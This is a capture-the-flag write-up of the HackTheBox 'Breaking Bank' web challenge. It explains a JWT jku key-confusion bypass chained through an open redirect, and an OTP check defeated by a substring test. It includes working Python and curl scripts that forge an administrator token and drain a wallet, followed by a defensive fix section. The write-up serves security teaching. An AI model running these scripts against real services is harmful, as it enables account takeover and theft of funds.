---
title: "Breaking Bank"
date: 2027-10-12 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, jwt, jku, jwks, open-redirect, otp, auth-bypass]
description: "An Easy web challenge where a JWT verifier trusts the token's own jku key URL behind a startsWith() prefix check. Chain the app's own open redirect to feed the verifier an attacker-hosted JWKS, forge the financial-controller, bypass a substring OTP check, and drain a wallet to release the flag."
---

## Overview

`Breaking Bank` is an Easy HackTheBox **Web** challenge — a Fastify + Redis crypto-bank API. The flag is only returned by `GET /api/dashboard` once the **financial controller's CLCR wallet is drained to zero**. To get there we abuse two flaws: a JWT `jku` header that is trusted behind a weak `startsWith()` prefix check (chained with the app's own open redirect), and an OTP gate that uses a substring `includes()` test instead of equality. Forge the controller, bypass the OTP, transfer out all the CLCR, collect the flag.

## The technique

### Vuln 1 — `jku` trusted behind a prefix check + open redirect ([CWE-347](https://cwe.mitre.org/data/definitions/347.html))

The token verifier reads the public-key URL from the token's own `jku` header and only checks that it *starts with* a trusted prefix:

```js
const { kid, jku } = jwt.decode(token, { complete: true }).header;
if (!jku.startsWith('http://127.0.0.1:1337/')) throw 'bad jku'; // prefix != host
const jwks = (await axios.get(jku)).data;                       // axios follows 302 by default
jwt.verify(token, jwkToPem(jwks.keys.find(k => k.kid === kid)));
```

`startsWith()` validates a **prefix, not the host**, and `axios` follows redirects. The app *also* ships an unauthenticated open redirect:

```
GET /api/analytics/redirect?ref=x&url=<anything>  ->  302 Location: <anything>
```

So a `jku` of `http://127.0.0.1:1337/api/analytics/redirect?ref=x&url=<attacker-jwks>` passes the prefix check **and** bounces the verifier out to our server. We host a JWKS containing the server's real `kid` plus *our* public key, sign a token with *our* private key, and the verifier validates it — letting us forge any identity, including `financial-controller@frontier-board.htb`.

### Vuln 2 — OTP compared with `includes()` ([CWE-697](https://cwe.mitre.org/data/definitions/697.html))

The transfer endpoint's OTP middleware checks containment, not equality:

```js
if (!otp.includes(validOtp)) {            // substring, not equality
  return reply.status(401).send({ error: 'Invalid OTP.' });
}
```

`validOtp` is a 4-digit number. Send a single string that contains **every** 4-digit value and the check always passes — no knowledge of the real OTP, no rate-limit trip:

```python
"".join(str(i) for i in range(1000, 10000))   # "100010011002...9999"
```

## Solution

First read the server's real `kid` from `/.well-known/jwks.json`, then generate our own RSA keypair and publish a JWKS carrying that same `kid` with our modulus. axios JSON-parses string bodies regardless of `Content-Type`, so any raw paste host works (a public host is required — the verifier reaches the internet, not your NAT'd box):

Create `make_jwks.py`:

```python
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
import json, base64

KID = "<server-kid-from-/.well-known/jwks.json>"
key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
open("priv.pem", "wb").write(key.private_bytes(
    serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8,
    serialization.NoEncryption()))
pub = key.public_key().public_numbers()
b64u = lambda n: base64.urlsafe_b64encode(
    n.to_bytes((n.bit_length() + 7) // 8, 'big')).rstrip(b'=').decode()
jwk = {"kty": "RSA", "n": b64u(pub.n), "e": b64u(pub.e),
       "alg": "RS256", "use": "sig", "kid": KID}
open("jwks.json", "w").write(json.dumps({"keys": [jwk]}))
```

```bash
python3 make_jwks.py
curl -s -F "content=<jwks.json" -F "syntax=json" https://dpaste.com/api/v2/   # -> URL, raw = URL + ".txt"
```

Then run the full chain — forge the controller, read its balance, register a recipient, drain via the OTP bypass, and read the flag:

Create `solve.py`:

```python
import jwt, requests
from urllib.parse import quote

BASE   = "http://<host>:<port>"
KID    = "<server-kid>"
JWKS   = "https://dpaste.com/<id>.txt"          # our hosted JWKS (raw)
CTRL   = "financial-controller@frontier-board.htb"
PRIV   = open("priv.pem").read()
S      = requests.Session()

jku = f"http://127.0.0.1:1337/api/analytics/redirect?ref=x&url={quote(JWKS, safe='')}"
tok = jwt.encode({"email": CTRL}, PRIV, algorithm="RS256",
                 headers={"kid": KID, "jku": jku})
H = {"Authorization": f"Bearer {tok}"}

clcr = next(c for c in S.get(f"{BASE}/api/crypto/balance", headers=H).json()
            if c["symbol"] == "CLCR")["availableBalance"]
S.post(f"{BASE}/api/auth/register", json={"email": "atk@evil.htb", "password": "x"})
otp = "".join(str(i) for i in range(1000, 10000))
S.post(f"{BASE}/api/crypto/transaction", headers=H,
       json={"to": "atk@evil.htb", "coin": "CLCR", "amount": clcr, "otp": otp})
print(S.get(f"{BASE}/api/dashboard", headers=H).json().get("flag"))
```

```bash
python3 solve.py
# HTB{...}
```

> The middleware re-fetches `jku` on **every** request, so a slow/throttling paste host yields an intermittent `401 Invalid Signature` — just retry; the first success proves the chain is sound.

## Why it worked

The signature is only as trustworthy as the **source of the verification key**. Trusting a key URL taken from the token, validating that URL with a prefix check instead of an exact origin, and following redirects together collapse into a full key-confusion authentication bypass — the attacker supplies both the key and the signature. The OTP `includes()` flaw compounds it: a containment test on a low-entropy secret is bypassed by one enumerating string.

## Fix / defense

- **`jku`:** never fetch verification keys from a token-supplied URL. Pin the JWKS to a fixed internal value or an allowlisted IdP; if a URL must be checked, compare the full origin with `===` (host + port), not `startsWith()`, and disable redirect following (`axios maxRedirects: 0`).
- **Open redirect:** allowlist redirect targets; reject absolute/off-host URLs ([CWE-601](https://cwe.mitre.org/data/definitions/601.html)).
- **OTP:** compare with constant-time equality (`crypto.timingSafeEqual`) after a length check, make OTPs single-use, and bound attempts.
